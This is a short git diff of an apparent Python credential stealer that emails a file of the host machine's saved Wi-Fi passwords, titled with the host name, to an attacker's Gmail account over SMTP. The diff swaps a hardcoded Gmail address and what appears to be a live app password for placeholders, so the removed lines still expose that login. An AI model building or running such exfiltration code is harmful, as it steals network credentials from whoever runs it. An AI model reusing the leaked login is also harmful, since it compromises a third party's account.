@@ -34,15 +34,15 @@ sysHostName = platform.uname()[1]
 
 # SENDING MAIL WITH PASSWORDS
 message = MIMEMultipart()
-message["from"] = "ameyswork1@gmail.com"
-message["to"] = "ameyswork1@gmail.com"
+message["from"] = "SENDER MAIL"
+message["to"] = "RECEIVER MAIL"
 message["subject"] = f"Wi-Fi Passwords of {sysHostName}"
 
 try:
     with smtplib.SMTP(host="smtp.gmail.com", port=587) as smpt:
         smpt.ehlo()
         smpt.starttls()
-        smpt.login("ameyswork1@gmail.com", password="roxlyaddndiyeeta")
+        smpt.login("LOGIN", password="PASSWORD")
         f = open("wifi_passwords.txt")
         attachment = MIMEText(f.read())
         attachment.add_header('Content-Disposition',
